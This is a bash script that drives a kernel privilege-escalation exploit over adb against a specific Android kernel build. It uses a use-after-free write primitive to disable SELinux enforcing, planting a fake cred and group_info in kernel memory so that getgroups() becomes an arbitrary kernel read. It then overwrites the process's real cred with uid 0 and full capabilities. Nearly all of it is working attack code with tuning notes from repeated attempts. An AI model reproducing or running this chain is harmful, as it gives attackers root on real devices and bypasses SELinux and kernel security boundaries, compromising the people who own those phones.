#!/usr/bin/env bash
# Rooting 7 without borrowing init_cred: get ONE ARBITRARY READ, then edit the target's own cred in
# place so it keeps its own SELinux domain (ledger 491/492: a task pointed at init_cred is
# u:r:kernel:s0, and this firmware quietly executes such a task at its first open/fork/setresuid/execve).
#
# The read comes from getgroups().  tools/ksdis.py SyS_getgroups on THIS Image:
#   ldr x3,[task,#0x4c0]    cred
#   ldr x6,[x3,#0x88]       cred->group_info
#   ldr w2,[x6,#4]          group_info->ngroups
#   ldr x4,[x6,#0x90+8*i]   group_info->blocks[i/1024]   <- dereferenced as a KERNEL pointer
#   ldr w3,[x4,#4*(i%1024)] ; str w3,[userbuf+i*4]
# A group_info parked at a known .data address, with only `ngroups` and `blocks[0]` written by the
# arbitrary write, therefore makes our own syscall copy 4 bytes at a time out of any kernel address.
# No leak-window coverage (ledger 492 killed that), no addr_limit anchor, and -- the reason this is
# safe where the impersonation experiments were not -- it allocates no struct file, copies no cred,
# and touches cred+0x88 and nothing else.  ngroups words per call = 128 bytes.
#
# FORK IS BANNED while cred points at the crafted object: copy_creds would hand that cred to a child,
# and the child's exit path kfree()s cred->security and put_group_info()s -> groups_free() ->
# kfree(blocks[0]) (witnessed at groups_free+0x18/+0x48).  Both are pointers into .data, so kfree
# there is the oops that rebooted ledger 493 twice.  broot gates exec_probe on the same securebits
# marker this script uses, and the crafted cred/group_info carry inflated refcounts as a second lock.
#
# The ruler is permutation-sensitive and every known answer comes from the SAME task: its pre-phase
# /proc/self/status Uid (uid euid suid fsuid) and Gid (gid egid sgid fsgid) columns must reappear at
# cred+0x04,0x0c,0x14,0x1c and +0x08,0x10,0x18,0x20, CapEff/CapBnd at +0x38/+0x40, and its pid at
# task+0x490.  Before that, the channel must return the bytes we wrote ourselves.
#
# Everything is memory state: adb reboot restores factory.
set -eu
set -o pipefail

ROOT=$(cd "$(dirname "$0")" && pwd)
SER=${SER:-$(adb devices | awk 'NR==2 && $2=="device"{print $1}')}
ADB="adb -s $SER"
DEV=/data/local/tmp
OUT=$DEV/cred.txt
IMG=$ROOT/../fw/7/Image
TSV=$ROOT/../art/task_offsets-7.tsv
LOCAL=/tmp/credleak-$(date +%H%M%S).txt

KREL=$($ADB shell uname -r 2>/dev/null | tr -d '\r' || true)
case "$KREL" in
  3.18.31-perf-g9dce1fbc9*)
    SELINUX_ENFORCING=0xffffffc001d5dbe4
    MODPROBE_PATH=0xffffffc001a499b8	# umh judged dead on this ROM (ledger 483/484) -> ground we may use
    INIT_CRED=0xffffffc001a4ad08
    INIT_UTS_NS=0xffffffc001a41bf8	# struct new_utsname is 6*65 writable bytes at +4: our group_info
    OFF_TASK_CRED=0x4c0; OFF_TASK_REALCRED=0x658; OFF_TASK_PID=0x490
    OFF_CRED_IDS=0x04; OFF_CRED_SB=0x24; OFF_CRED_CAPS=0x28; OFF_CRED_SEC=0x70
    OFF_CRED_GRP=0x88; OFF_CRED_CAPEFF=0x38; OFF_CRED_CAPBND=0x40
    OFF_GI_BLOCKS=0x90
    TSEC_OFF=0xe0; FAKE_OFF=0x00; GI_OFF=0x60; CRED_BYTES=0xa0 ;;
  *) printf 'ABORT: kernel %s has no verified profile\n' "$KREL" >&2; exit 1 ;;
esac

ROUNDS=${ROUNDS:-8}
HOLD=${HOLD:-1200}
NICE=${NICE:-7}
BPFDS=${BPFDS:-8}
# The needle is a lottery on *time adjacency*: a candidate only lands in the window when our own
# binder_procs were allocated next to the slot the round just freed.  Measured with the 6.0.1-identical
# knobs (ROUNDS=6 PERROUND=3 BPFDS=8): some boots agree within six rounds and some accept 0 candidates
# in eight, so all three are dials here rather than constants.
PERROUND=${PERROUND:-3}
NGRP=${NGRP:-32}			# getgroups() reads exactly group_info->ngroups words
SBMARK=${SBMARK:-64}			# securebits in the CRAFTED cred: the "it is in use" marker
TSECVA=$(python3 -c "print(hex($MODPROBE_PATH + $TSEC_OFF))")
FAKEVA=$(python3 -c "print(hex($MODPROBE_PATH + $FAKE_OFF))")
GIVA=$(python3 -c "print(hex($INIT_UTS_NS + $GI_OFF))")

addr_add() { python3 -c "import sys; print(hex(int(sys.argv[1],16) + int(sys.argv[2],16)))" "$1" "$2"; }
le64_hex() { python3 -c "import sys; print(int(sys.argv[1],16).to_bytes(8,'little').hex())" "$1"; }
# The channel only ever hands back u32 words, so an 8-byte kernel value arrives as TWO words, low
# word first.  Assembling them as if the pair were big-endian -- which I did once while testing --
# turns every pointer into garbage.
words2u64() { python3 -c "import sys; print(hex(int(sys.argv[2],16) << 32 | int(sys.argv[1],16)))" "$1" "$2"; }
inband() { python3 -c "import sys; v=int(sys.argv[1],16); sys.exit(0 if 0xffffff8000000000 <= v < 0xffffffd000000000 else 1)" "$1"; }
fire() { # addr hexpayload -- the UAF write is a per-attempt lottery
	local i
	for i in 1 2 3; do
		if $ADB shell "$DEV/clobber 14 kern $1 hex:$2 4 0" 2>&1 | tr -d '\r' | grep -q 'CLOBBER OK'; then
			printf '  write %-22s <- %-20s : OK (try %d)\n' "$1" "${2:0:20}" "$i"
			return 0
		fi
	done
	printf '  write %s : no hit in three batches\n' "$1" >&2
	return 1
}
gline() { $ADB shell "grep -a '^GRP' $OUT 2>/dev/null" | tr -d '\r' | tail -n 1 || true; }
wlist() { printf '%s\n' "$1" | sed 's/.*n0=[0-9-]*//' | tr -s ' \n' '\n' | grep -E '^[0-9a-f]{8}$' || true; }
wAt() { printf '%s\n' "$(wlist "$1" | sed -n "$(( $2 / 4 + 1 ))p")"; }	# $2 = offset from the aim

LAST=""
read_at() { # aim_hex -- re-aim blocks[0], then print the first SETTLED sample: two reads 6 s apart
	# that agree.  The aim write is itself a lottery, so a sample taken before it lands must not be
	# read as "that is what lives there".
	local L1="" L2="" _
	fire "$(addr_add "$GIVA" $OFF_GI_BLOCKS)" "$(le64_hex $1)" || return 1
	for _ in $(seq 1 30); do
		sleep 3
		L1=$(gline)
		if [ -n "$L1" ] && [ "$L1" != "$LAST" ]; then break; fi
	done
	[ -n "$L1" ] || { printf 'read_at: no GRP sample after aiming at %s\n' "$1" >&2; return 1; }
	sleep 6
	L2=$(gline)
	if [ "$L2" != "$L1" ]; then
		printf 'read_at: sample moved, taking a third\n' >&2
		L1=$L2
		sleep 6
		L2=$(gline)
		[ "$L2" = "$L1" ] || printf 'read_at: STILL moving -- this sample is not trustworthy\n' >&2
	fi
	LAST=$L2
	printf '%s\n' "$L2"
}
permutation() { # sampleline "off,off,.." "expected values" -> prints and returns 0 iff they agree
	python3 - "$1" "$2" "$3" <<'PY'
import sys
w = sys.argv[1].split()
exp = sys.argv[3].split()
offs = [int(x, 16) for x in sys.argv[2].split(',')]
try:
    got = [str(int(w[o // 4], 16)) for o in offs]
except IndexError:
    print("  got NOTHING (short sample: %d words for offsets %s)" % (len(w), sys.argv[2]))
    sys.exit(1)
ok = got == exp
print("  read %-14s -> %-24s expected %-24s %s" % ("[" + sys.argv[2] + "]", " ".join(got), " ".join(exp),
                                                   "MATCH" if ok else "DIFFER"))
sys.exit(0 if ok else 1)
PY
}

[ -x "$ROOT/broot" ] && [ -x "$ROOT/clobber" ] || { printf 'ABORT: build broot and clobber first\n' >&2; exit 1; }
grep -aq 'GRP rc=' "$ROOT/broot" || { printf 'ABORT: %s/broot predates the getgroups read channel\n' "$ROOT" >&2; exit 1; }
grep -aq 'planted pair 0:' "$ROOT/broot" || { printf 'ABORT: %s/broot cannot accept parent-only candidates (stale binary)\n' "$ROOT" >&2; exit 1; }
for f in broot clobber; do
	$ADB push "$ROOT/$f" "$DEV/$f" >/dev/null 2>&1 || { printf 'ABORT: push %s\n' "$f" >&2; exit 1; }
	$ADB shell chmod 0755 "$DEV/$f" >/dev/null 2>&1 || true
done
# Offsets are re-decoded from the Image before anything touches the device, and the rows this script
# depends on must be present in the published table (tools/task_offsets_7.py --selftest: 4 arms red).
python3 "$ROOT/task_offsets_7.py" >/dev/null || { printf 'ABORT: the offset table would not re-decode\n' >&2; exit 1; }
for row in 'cred group_info 0x88' 'group_info ngroups 0x4' 'group_info nblocks 0x8' \
           'group_info blocks 0x90' 'task_struct cred 0x4c0' 'task_struct real_cred 0x658' \
           'task_struct pid 0x490' 'cred uid 0x4' 'cred cap_bset 0x40'; do
	set -- $row
	awk -F'\t' -v s="$1" -v f="$2" -v o="$3" '$1==s && $2==f && $3==o {hit=1} END{exit !hit}' "$TSV" \
		|| { printf 'ABORT: %s.%s@%s is not a witnessed row in %s\n' "$1" "$2" "$3" "$TSV" >&2; exit 1; }
done
printf '  %d offset rows required, all witnessed in %s\n' 9 "$TSV"
printf 'kernel %s  cred=%s tsec=%s group_info=%s  ngroups=%s\n' "$KREL" "$FAKEVA" "$TSECVA" "$GIVA" "$NGRP"

printf '\n=== 0. flip enforcing FIRST: it is the channel every later check reads through ===\n'
# Two reasons this is step 0 again, with the evidence to back it: (a) /proc/sys/kernel/modprobe is
# unreadable by `shell` under Enforcing -- that is exactly what faked a "read back" last round (66
# bytes = the Permission denied text that adb exec-out folds into stdout); (b) reading /proc/kmsg,
# the only way to catch the oops this box produces (no pstore), is a MAC decision too.  And unlike
# every other write in this chain, THIS one carries its own proof of landing: getenforce answers.
if ! $ADB shell getenforce 2>/dev/null | tr -d '\r' | grep -q Permissive; then
	fire "$SELINUX_ENFORCING" 00000000 || exit 1
	GE=$($ADB shell getenforce 2>/dev/null | tr -d '\r' || true)
	printf '  getenforce now: %s\n' "$GE"
	[ "$GE" = Permissive ] || { printf 'ABORT: the enforcing write reported OK but getenforce still says %s\n' "$GE" >&2; exit 1; }
fi
# Append-only stream on /data: it survives the reboot, so the oops text is still there next boot.
$ADB shell "rm -f $DEV/kmsg.log; cd $DEV; setsid nohup sh -c 'cat /proc/kmsg >> $DEV/kmsg.log' >/dev/null 2>&1 < /dev/null &" >/dev/null 2>&1 || true
printf '  /proc/kmsg streamer started on-device (file: %s)\n' "$DEV/kmsg.log"
if [ "${ENFORCE_NOW:-1}" = 0 ]; then
	printf '  (ENFORCE_NOW=0 given, but the read-back and kmsg channels need it -- ignoring)\n'
fi

printf '\n=== 1. leak window + needle: which task is ours ===\n'
# Stop any holder left over from an earlier attempt -- with SIGTERM, never -9.  Measured the hard way:
# two rounds of this session killed holders mid-UAF, and every subsequent round then printed "attempt
# failed" (no window at all) with the SAME binary and knobs that had agreed minutes before; an
# `adb reboot` brought the window straight back.  A holder being torn down while the poisoned wait
# queue is still live is what costs us the window, so the cleanup here is deliberately gentle.
STALE=$($ADB shell "pidof broot" 2>/dev/null | tr -d '\r') || true
if [ -n "$STALE" ]; then
	printf '  terminating leftover holder(s): %s (SIGTERM, never -9 -- ledger 497)\n' "$STALE"
	$ADB shell "kill $STALE" >/dev/null 2>&1 || true
	for _ in $(seq 1 10); do
		if [ -z "$($ADB shell "pidof broot" 2>/dev/null | tr -d '\r')" ]; then break; fi
		sleep 2
	done
fi
$ADB shell "rm -f $OUT; cd $DEV; SPAN=0x400000 SIG=1 GRP=$NGRP SBMARK=$SBMARK NICE=$NICE BPFDS=$BPFDS PERROUND=$PERROUND HOLD=$HOLD setsid nohup $DEV/broot $ROUNDS > $OUT 2>&1 < /dev/null &" >/dev/null 2>&1 || true
LINE=""
TRIES=""
for AT in $(seq 1 ${NEEDLE_ATTEMPTS:-6}); do
	STALE=$($ADB shell "pidof broot" 2>/dev/null | tr -d '\r') || true
	if [ -n "$STALE" ]; then
		printf '  attempt %s: terminating leftover holder %s (SIGTERM, never -9)\n' "$AT" "$STALE"
		$ADB shell "kill $STALE" >/dev/null 2>&1 || true
		sleep 4
	fi
	printf '  attempt %s/%s: holder up (ROUNDS=%s BPFDS=%s PERROUND=%s)\n' "$AT" "${NEEDLE_ATTEMPTS:-6}" "$ROUNDS" "$BPFDS" "$PERROUND"
	$ADB shell "rm -f $OUT; cd $DEV; SPAN=0x400000 SIG=1 GRP=$NGRP SBMARK=$SBMARK NICE=$NICE BPFDS=$BPFDS PERROUND=$PERROUND HOLD=$HOLD setsid nohup $DEV/broot $ROUNDS > $OUT 2>&1 < /dev/null &" >/dev/null 2>&1 || true
	for _ in $(seq 1 $((ROUNDS * 6))); do
		LINE=$($ADB shell "grep -m1 -oE 'TASKVA=0x[0-9a-f]+ pid=[0-9]+.*' $OUT 2>/dev/null" | tr -d '\r' || true) || true
		if [ -n "$LINE" ]; then break; fi
		sleep 4
	done
	if [ -n "$LINE" ]; then break; fi
	FA=$($ADB shell "grep -c 'attempt failed' $OUT 2>/dev/null" 2>&1 | tr -d '\r' | tail -n 1 || true)
	LK=$($ADB shell "grep -c 'verdict=LEAKED' $OUT 2>/dev/null" 2>&1 | tr -d '\r' | tail -n 1 || true)
	printf '  attempt %s: window leaked %s/%s rounds, failed %s -- no agreement, retrying\n' "$AT" "${LK:-0}" "$ROUNDS" "${FA:-?}"
	TRIES="$TRIES ${AT}:leaked=${LK:-0}/$ROUNDS"
done
[ -n "$LINE" ] || {
	printf 'ABORT: the needle never agreed across attempts:%s\n' "$TRIES" >&2
	$ADB shell "grep -E 'round|scan_sigs|planted|GRP' $OUT" 2>&1 | tr -d '\r' | tail -n 10 || true
	exit 1
}
printf '  %s\n' "$LINE"
TASK=$(sed 's/^TASKVA=//; s/ .*//' <<<"$LINE")
HPID=$(sed 's/.* pid=//; s/ .*//' <<<"$LINE")
# show_creds("pre ") runs when the leak rounds are OVER and the hold begins, so it can legitimately be
# a minute behind the TASKVA line; waiting for it is not a failure of the needle.
PRE=0
for _ in $(seq 1 40); do
	PRE=$($ADB shell "grep -c 'pre : ' $OUT 2>/dev/null" 2>&1 | tr -d '\r' | tail -n 1 || true)
	if [ "${PRE:-0}" -ge 4 ]; then break; fi
	sleep 4
done
[ "${PRE:-0}" -ge 4 ] || { printf 'ABORT: only %s pre-phase self-status lines -- nothing to calibrate against\n' "${PRE:-0}" >&2; exit 1; }
$ADB shell "grep -E 'pre : ' $OUT" 2>&1 | tr -d '\r' | sed 's/^/  /' || true
# /proc's Uid line is (uid euid suid fsuid) and Gid is (gid egid sgid fsgid) -- four columns each,
# read out of this very task by the kernel.  The cred words have to reappear in that exact
# permutation, which is what makes this a test of the offset table instead of "some 2000 turned up".
pv() { $ADB shell "grep -m1 'pre : $1' $OUT" 2>&1 | tr -d '\r' | awk '{print $4, $5, $6, $7}' || true; }
P_UID=$(pv Uid); P_GID=$(pv Gid)
P_BND=$(pv CapBnd | cut -d' ' -f1); P_EFF=$(pv CapEff | cut -d' ' -f1)
printf '  known answers from this task: Uid=[%s] Gid=[%s] CapBnd=%s CapEff=%s\n' "$P_UID" "$P_GID" "$P_BND" "$P_EFF"

printf '\n=== 2. park the crafted cred, its tsec, and the group_info in the uts block ===\n'
fire "$TSECVA" "$(python3 -c "import struct;print(struct.pack('<IIIIII',1,1,0,0,0,0).hex())")" || exit 1
mapfile -t CH < <(python3 - "$IMG" "$INIT_CRED" "$TSECVA" "$GIVA" "$SBMARK" "$CRED_BYTES" <<'PY'
import struct, sys
img, init_cred, tsecva, giva, sbmark, size = sys.argv[1:7]
TB = 0xFFFFFFC000080000
data = open(img, 'rb').read()
base = int(init_cred, 16) - TB
size = int(size, 16)
c = bytearray(data[base:base + size])
assert struct.unpack_from('<I', c, 0x00)[0] == 4, "usage != 4: that is not init_cred"
assert struct.unpack_from('<Q', c, 0x30)[0] == 0x3fffffffff, "cap_permitted != full: not a cred"
for o in (0x78, 0x80, 0x88):
    v = struct.unpack_from('<Q', c, o)[0]
    assert 0xffffffc000000000 <= v < 0xffffffd000000000, "slot %#x is not a VA" % o
struct.pack_into('<I', c, 0x00, 0x11111111)      # usage: huge AND no zero byte -> sysctl read can reach it
for o in range(0x04, 0x24, 4):
    struct.pack_into('<I', c, o, 2000)           # ids stay shell: the holder must not look rooted yet
struct.pack_into('<I', c, 0x24, int(sbmark))     # the marker that says "crafted cred in use"
for o in (0x28, 0x30, 0x38, 0x40):
    struct.pack_into('<Q', c, o, 0)
struct.pack_into('<Q', c, 0x70, int(tsecva, 16))  # cred->security -> our tsec
struct.pack_into('<Q', c, 0x88, int(giva, 16))    # cred->group_info -> our group_info = the read
h = bytes(c).hex()
for i in range(0, len(h), 128):
    print(h[i:i + 128])
PY
)
printf '  cred image: %d writes of <=64 bytes\n' "${#CH[@]}"
i=0
for pl in "${CH[@]}"; do
	fire "$(addr_add "$FAKEVA" $(( i * 64 )))" "$pl" || exit 1
	i=$(( i + 1 ))
done
# usage / ngroups / nblocks in one 12-byte write.  usage is inflated for the same reason cred usage
# is: groups_free() kfree()s blocks[0] once the refcount dies, and blocks[0] is a kernel VA we chose.
# Staged, because the box has rebooted on this boundary five times and the two causes need different
# fixes: ngroups starts at ZERO so the holder's getgroups(0,NULL) reads exactly one word (gi->ngroups)
# and never dereferences blocks[0].  Raising it to NGRP is what lets the first buffered read happen,
# so "cred pointer moved" and "block deref killed us" get separate witnesses.
fire "$GIVA" "$(python3 -c "import struct;print(struct.pack('<III',200000,0,1).hex())")" || exit 1
# blocks[0] MUST be aimed before the crafted cred is ever in use, and this is the step that makes
# that true.  The holder is already calling getgroups() every few seconds (GRP=..); the instant
# task->cred points at the crafted cred, the next of those reads `ngroups` words through blocks[0] --
# if that slot still holds uts string bytes ("#1 SMP PREEMPT..."), it is a garbage kernel pointer and
# the load oopses, panic_on_oops reboots (measured: the box went down exactly on the cred-pointer
# write, and the driver's "the cred write did not land" message was the *opposite* of the truth --
# it landed, and the read that followed is what killed it).  Aiming it at our own crafted cred makes
# the very first sample a self-read of bytes we wrote: safe, and a known answer into the bargain.
fire "$(addr_add "$GIVA" $OFF_GI_BLOCKS)" "$(le64_hex $FAKEVA)" || exit 1

printf '\n=== 2b. read the modprobe buffer back BEFORE anything points at it ===\n'
# /proc/sys/kernel/modprobe is a *string* handler: cat gives the bytes up to the first NUL, so this
# channel can prove only the leading bytes landed -- which is why the crafted image deliberately
# starts with usage (40 0d 03, no NUL) and why a NUL-terminated read of >=3 matching bytes is the
# claim being tested here, not "the whole 160 bytes".  The rest of the image is proven later by the
# holder itself: `sb=` covers securebits, `uid=` covers the ids, and `n0=32` is the proof that
# cred->group_info (the one slot the first deref needs) is what we wrote.
$ADB exec-out "cat /proc/sys/kernel/modprobe" > /tmp/mp.bin 2>/dev/null || true
python3 - "$TSECVA" "${CH[@]}" <<'PY'
import sys
exp = bytes.fromhex(''.join(sys.argv[2:]))
got = open('/tmp/mp.bin', 'rb').read()
if b'Permission denied' in got or got.startswith(b'/system/bin/sh'):
    print("  channel refused: %r" % got[:70]); sys.exit(1)
n = min(len(got), len(exp))
# do_string() prints the terminator: the NUL that ends the kernel's copy comes back as '\n', so a
# 0x0a where the image has 0x00 is the SAME byte, not a mismatch.
bad = [i for i in range(n) if got[i] != exp[i] and not (got[i] == 0x0a and exp[i] == 0)]
print("  buffer prefix read back: %d bytes (crafted image starts %s, kernel %s)"
      % (len(got), exp[:6].hex(), got[:6].hex()))
if bad or n < 6:
    o = bad[0] if bad else n
    print("  MISMATCH at cred+%#x: wrote %02x, kernel says %02x" % (o, exp[o], got[o] if o < len(got) else 0))
    sys.exit(1)
print("  PASS: the image is landing where MODPROBE_PATH says (first %d bytes byte-exact)" % n)
PY
[ $? -eq 0 ] || { printf 'ABORT: crafted cred not verified in the modprobe buffer -- refusing to redirect cred (that is what reboots the box)\n' >&2; exit 1; }
# cred->group_info is the single slot the first getgroups() dereferences, so it gets its own
# 8-byte write here (repeated, not folded into a 64-byte chunk): a torn chunk could otherwise leave
# a half-old/half-new pointer, and the very next sample would then read through garbage.
for _ in 1 2 3; do
	fire "$(addr_add "$FAKEVA" $OFF_CRED_GRP)" "$(le64_hex $GIVA)" && break
done

printf '\n=== 3. point cred at the crafted object (real_cred stays the shell cred) ===\n'
BOOT0=$($ADB shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null" | tr -d '\r' || true) || true
fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$(le64_hex $FAKEVA)" || exit 1
SEEN=""
for _ in $(seq 1 20); do
	sleep 3
	SEEN=$(gline)
	if grep -q "sb=$SBMARK n0=0" <<<"$SEEN"; then break; fi
done
[ -n "$SEEN" ] || { printf 'ABORT: no GRP sample at all -- the holder is gone or GRP did not take\n' >&2; exit 1; }
printf '  sample: %s\n' "$SEEN"
grep -q "sb=$SBMARK" <<<"$SEEN" || {
	BOOT1=$($ADB shell "cat /proc/sys/kernel/random/boot_id 2>/dev/null" | tr -d '\r' || true)
	if [ -n "$BOOT1" ] && [ "$BOOT1" != "$BOOT0" ]; then
		printf 'ABORT: the device rebooted between the write and the sample -- the cred write LANDED and what the holder did next oopsed (no pstore here, so read dmesg on the way down, not after)\n' >&2
	else
		printf 'ABORT: no reboot, securebits still not %s -- the cred-pointer write genuinely missed\n' "$SBMARK" >&2
	fi
	exit 1
}

printf '\n=== 3b. raise ngroups: only now may a buffered getgroups() run ===\n'
fire "$GIVA" "$(python3 -c "import struct;print(struct.pack('<I',$NGRP).hex())")" || exit 1
RAISED=""
for _ in $(seq 1 20); do
	sleep 3
	RAISED=$(gline)
	if grep -q "n0=$NGRP" <<<"$RAISED"; then break; fi
done
printf '  sample after the raise: %s\n' "$RAISED"
grep -q "n0=$NGRP" <<<"$RAISED" || { printf 'ABORT: ngroups never read back as %s (either the raise missed or the deref itself is what kills the holder)\n' "$NGRP" >&2; exit 1; }
printf '  PASS: cred->group_info reachable AND blocks[] deref survives -- the read channel is open\n'

printf '\n=== 4. calibration: read bytes we wrote ourselves ===\n'
S=$(read_at "$FAKEVA") || { printf 'ABORT: channel never answered\n' >&2; exit 1; }
W=$(wlist "$S" | tr -s '\n' ' ')
EXP=$(python3 -c "
import struct, sys
b = bytes.fromhex(''.join(sys.argv[1:]))
print(' '.join('%08x' % struct.unpack_from('<I', b, 4 * i)[0] for i in range(min($NGRP, len(b) // 4))))" "${CH[@]}")
printf '  read back: %s\n  expected : %s\n' "$W" "$EXP"
[ "$W" = "$EXP" ] || { printf 'ABORT: the channel is not a read of the address we aimed at; nothing further runs\n' >&2; exit 1; }
printf '  PASS: %s words came back as the little-endian u32s of a buffer we filled\n' "$NGRP"

printf '\n=== 5. known answers through the channel ===\n'
S=$(read_at "$(addr_add "$TASK" $(( OFF_TASK_PID - 8 )))") || exit 1
PIDW=$(wAt "$S" 8)
[ -n "$PIDW" ] || { printf 'ABORT: short sample on the pid read\n' >&2; exit 1; }
printf '  task+0x490 reads %s, the needle named pid=%s\n' "$(( 0x$PIDW ))" "$HPID"
[ "$(( 0x$PIDW ))" = "$HPID" ] || { printf 'ABORT: our own pid did not come back -- that task is not ours, or the read lies\n' >&2; exit 1; }
S=$(read_at "$(addr_add "$TASK" $OFF_TASK_REALCRED)") || exit 1
ORIG=$(words2u64 "$(wAt "$S" 0)" "$(wAt "$S" 4)")
printf '  real_cred@task+0x%x = %s\n' "$OFF_TASK_REALCRED" "$ORIG"
inband "$ORIG" || { printf 'ABORT: real_cred decoded outside the kernel VA band -- refusing to use it\n' >&2; exit 1; }

printf '\n=== 6. read the REAL cred and check it against this task s own /proc/self/status ===\n'
S=$(read_at "$ORIG") || exit 1
permutation "$S" 4,c,14,1c "$P_UID" || { printf 'ABORT: the Uid permutation does not hold at cred+0x04\n' >&2; exit 1; }
permutation "$S" 8,10,18,20 "$P_GID" || { printf 'ABORT: the Gid permutation does not hold at cred+0x08\n' >&2; exit 1; }
CEFF=$(words2u64 "$(wAt "$S" $OFF_CRED_CAPEFF)" "$(wAt "$S" $(( OFF_CRED_CAPEFF + 4 )))")
CBND=$(words2u64 "$(wAt "$S" $OFF_CRED_CAPBND)" "$(wAt "$S" $(( OFF_CRED_CAPBND + 4 )))")
printf '  cred+0x38 CapEff = %s   /proc said %s\n' "$CEFF" "$P_EFF"
printf '  cred+0x40 CapBnd = %s   /proc said %s\n' "$CBND" "$P_BND"
[ "$CEFF" = "$P_EFF" ] || printf '  NOTE: CapEff differs -- proc prints it through a mask, the cred word is raw\n'

S=$(read_at "$(addr_add "$ORIG" $OFF_CRED_SEC)") || exit 1
SEC=$(words2u64 "$(wAt "$S" 0)" "$(wAt "$S" 4)")
GRP=$(words2u64 "$(wAt "$S" $(( OFF_CRED_GRP - OFF_CRED_SEC )))" "$(wAt "$S" $(( OFF_CRED_GRP - OFF_CRED_SEC + 4 )))")
printf '  cred->security = %s   cred->group_info = %s\n' "$SEC" "$GRP"
inband "$SEC" || { printf 'ABORT: cred->security is not a VA -- the offset model or the read is wrong\n' >&2; exit 1; }
inband "$GRP" || { printf 'ABORT: cred->group_info is not a VA\n' >&2; exit 1; }
S=$(read_at "$SEC") || exit 1
printf '  tsec: osid=%s sid=%s  <-- the domain we are about to KEEP (0x%x/0x%x are SECINITSID_*)\n' \
	"$(( 0x$(wAt "$S" 0) ))" "$(( 0x$(wAt "$S" 4) ))" 1 2
SID=$(wAt "$S" 4)

printf '\n=== 7. edit the real cred in place, THEN hand it back ===\n'
# Order matters: while cred still points at the crafted object, the ids/caps we write are invisible,
# and the single restore write is what switches the task to root -- with its own user/user_ns/
# group_info/security, i.e. its own SELinux domain.
fire "$(addr_add "$ORIG" $OFF_CRED_IDS)" "$(python3 -c "print('00' * 32)")" || exit 1
fire "$(addr_add "$ORIG" $OFF_CRED_SB)" 00000000 || exit 1
fire "$(addr_add "$ORIG" $OFF_CRED_CAPS)" "$(python3 -c "import struct;print(struct.pack('<4Q',*[$((0x3fffffffff))]*4).hex())")" || exit 1
fire "$(addr_add "$TASK" $OFF_TASK_CRED)" "$(le64_hex $ORIG)" || exit 1
# Every kernel WRITE this chain needs has now been made.  Only the *witness* is left, and the exec of
# a probe child is the one step an avc denial could confound, so the global permissive flip happens
# here -- where losing it costs a reading, not the window.
if [ "${ENFORCE_LAST:-1}" = 1 ] && ! $ADB shell getenforce 2>/dev/null | tr -d '\r' | grep -q Permissive; then
	if fire "$SELINUX_ENFORCING" 00000000; then
		printf '  getenforce now: %s\n' "$($ADB shell getenforce 2>/dev/null | tr -d '\r' || true)"
	else
		printf '  NOTE: could not flip enforcing -- the exec witness will be judged under Enforcing\n'
	fi
fi
printf '  waiting for this task to answer that it is root in its own domain...\n'
for _ in $(seq 1 $((HOLD / 6))); do
	LIVE=$(gline)
	grep -q "sb=$SBMARK" <<<"$LIVE" || break
	sleep 4
done
printf '  live sample: %s\n' "$LIVE"
grep -q "sb=$SBMARK" <<<"$LIVE" && { printf 'ABORT: still on the crafted cred -- the restore write never landed\n' >&2; exit 1; }
for _ in $(seq 1 $((HOLD / 4))); do
	$ADB shell "grep -qE 'ROOTED|PROBE uid=0|execl-FAILED|L-open-devnull-rc' $OUT" >/dev/null 2>&1 && break || true
	sleep 4
done
$ADB shell "grep -E 'GRP rc=|SELFUID|ROOTED|step A|step B|PROBE |child status|post :|Uid:|Gid:|CapEff' $OUT" 2>&1 | tr -d '\r' | tail -n 40 | sed 's/^/  /' || true

printf '\n=== 8. outside witnesses (none of them the writer) ===\n'
$ADB shell "ps -A -o USER,PID,NAME 2>/dev/null | grep -w $HPID" 2>&1 | tr -d '\r' | sed 's/^/  ps: /' || true
$ADB shell "ls -ld /proc/$HPID 2>&1" 2>&1 | tr -d '\r' | sed 's/^/  /' || true
$ADB shell "cat /data/local/tmp/probe.uid 2>&1" 2>&1 | tr -d '\r' | sed 's/^/  probe child recorded: /' || true
$ADB shell "getenforce" 2>&1 | tr -d '\r' | sed 's/^/  getenforce: /' || true
$ADB pull $OUT $LOCAL >/dev/null 2>&1 || true
$ADB shell "dmesg | grep -cE 'Internal error|Oops|BUG:|kernel panic|Unable to handle|tainted'" 2>&1 | tr -d '\r' | sed 's/^/  kernel fault lines: /' || true
printf '  holder log: %s\n' "$LOCAL"
